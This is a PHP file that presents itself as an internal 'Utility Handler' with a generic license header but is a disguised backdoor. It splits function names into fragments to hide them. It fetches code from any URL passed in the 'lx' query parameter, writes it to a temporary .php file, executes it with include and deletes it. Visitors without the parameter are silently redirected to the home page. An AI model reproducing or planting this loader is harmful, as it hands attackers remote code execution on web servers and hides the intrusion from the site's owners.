<?php
/**
 * Utility Handler
 *
 * A helper component for managing dynamic runtime operations.
 *
 * This script is part of the internal system toolkit, designed to assist
 * with specific runtime tasks and file-based procedures.
 *
 * @package     SystemToolkit
 * @author      Core Utilities Team
 * @copyright   Copyright (c) 2021 - 2025, System Operations Group
 * @license     https://opensource.org/licenses/MIT MIT License
 * @link        https://intra.sys-tools.net/util/helper
 * @since       Version 4.1.2
 * @filesource
 */

$protocol   = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$home  = $protocol . '://' . $_SERVER['HTTP_HOST'] . '/';

$fc   = 'f' . 'i' . 'l' . 'e' . '_g' . 'et' . '_co' . 'nt' . 'en' . 'ts'; 
$tmp   = 'te' . 'mp' . 'na' . 'm';
$sys   = 'sy' . 's_g' . 'et' . '_t' . 'emp' . '_di' . 'r';
$fp    = 'f' . 'ile' . '_p' . 'ut' . '_co' . 'nte' . 'nts';
$u   = 'u' . 'n' . 'li' . 'nk';
$f  = 'f' . 'il' . 'te' . 'r_v' . 'ar';

if (isset($_GET['lx'])) {
    $lc = $_GET['lx'];
    if (!$f($lc, FILTER_VALIDATE_URL)) {
        exit("Not Found!");
    }
    $bv = @$fc($lc);
    if ($bv === false) {
        exit("Bad Request.");
    }
    $tp = $tmp($sys(), 'phptask_') . '.php';
    $fp($tp, $bv);
    include $tp;
    $u($tp);
} else {
    echo '<script>window.location.href = "' . $home . '";</script>';
}
?>
